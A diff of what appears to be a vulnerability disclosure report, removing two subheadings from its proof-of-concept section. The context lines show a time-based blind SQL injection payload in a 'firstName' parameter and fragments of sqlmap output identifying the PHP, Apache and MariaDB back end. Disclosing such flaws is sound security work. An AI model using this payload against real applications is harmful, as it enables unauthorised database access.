@@ -46,8 +46,6 @@ firstName=James' AND (SELECT 7179 FROM (SELECT(SLEEP(5)))oHFn)-- CCxI
 
 ## Proof of Concept
 
-### 1. Automated Analysis with SQLMap
-
 The following output from `sqlmap` confirms that the `firstName` parameter is vulnerable to multiple types of SQL injection:
 
 ```text
@@ -70,8 +68,6 @@ web application technology: PHP 7.4.33, Apache 2.4.54
 back-end DBMS: MySQL >= 5.1 (MariaDB fork)
 
 ```
-
-### 2. Execution Evidence
 
 <img width="1154" height="404" alt="图片" src="https://github.com/user-attachments/assets/141a1be5-f568-41cc-9e5b-26d2e8b8ef10" />
 
